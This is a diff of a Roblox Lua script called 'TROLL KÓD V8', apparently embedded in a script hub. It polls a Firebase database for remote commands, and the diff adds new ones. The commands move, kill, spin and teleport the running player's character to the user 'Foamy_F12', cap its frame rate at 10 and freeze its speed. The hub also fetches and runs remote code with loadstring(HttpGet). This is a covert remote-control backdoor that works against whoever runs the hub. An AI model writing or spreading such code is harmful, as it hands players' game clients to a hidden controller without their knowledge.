@@ -1,10 +1,10 @@
--- [[ TROLL KÓD V7 - FIX TELEPORT & SPIN ]]
+
+-- [[ TROLL KÓD V8 - Foamy_F12 FIX ]]
 local FIREBASE_URL = "https://troll-9ab62-default-rtdb.firebaseio.com/.json"
 local myName = "Foamy_F12" 
 local forcedSpeed = 16
 local spinEnabled = false
 
--- Kényszerített Sebesség & Spin Hurok
 task.spawn(function()
     while true do
         task.wait(0.05)
@@ -12,14 +12,8 @@ task.spawn(function()
             local char = game.Players.LocalPlayer.Character
             local hum = char.Humanoid
             local root = char.HumanoidRootPart
-            
-            -- Speed fix
             if hum.WalkSpeed ~= forcedSpeed then hum.WalkSpeed = forcedSpeed end
-            
-            -- Spin fix
-            if spinEnabled then
-                root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(45), 0)
-            end
+            if spinEnabled then root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(45), 0) end
         end)
     end
 end)
@@ -39,15 +33,18 @@ task.spawn(function()
                 local root = char and char:FindFirstChild("HumanoidRootPart")
                 
                 if hum and root then
+                    -- LÖKÉSEK JAVÍTVA
                     if data.cmd == "forward" then hum:MoveTo(root.Position + (root.CFrame.LookVector * 20))
+                    elseif data.cmd == "back" then hum:MoveTo(root.Position - (root.CFrame.LookVector * 20))
+                    elseif data.cmd == "left" then hum:MoveTo(root.Position - (root.CFrame.RightVector * 20))
+                    elseif data.cmd == "right" then hum:MoveTo(root.Position + (root.CFrame.RightVector * 20))
+                    
                     elseif data.cmd == "jump" then hum.JumpPower = 150 hum.Jump = true
                     elseif data.cmd == "respawn" then hum.Health = 0
                     elseif data.cmd == "spin" then spinEnabled = not spinEnabled
                     elseif data.cmd == "tp" then
                         local target = game.Players:FindFirstChild(myName)
-                        if target and target.Character then
-                            root.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
-                        end
+                        if target and target.Character then root.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0,3,0) end
                     elseif data.cmd == "fps10" then setfpscap(10)
                     elseif data.cmd == "fpsmax" then setfpscap(0)
                     elseif data.cmd == "speed0" then forcedSpeed = 0
@@ -59,8 +56,6 @@ task.spawn(function()
         end
     end
 end)
-
-
 
 -- [[ SLEENTY HUB ALAP - ÖSSZES SZKRIPTTEL ]]
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()
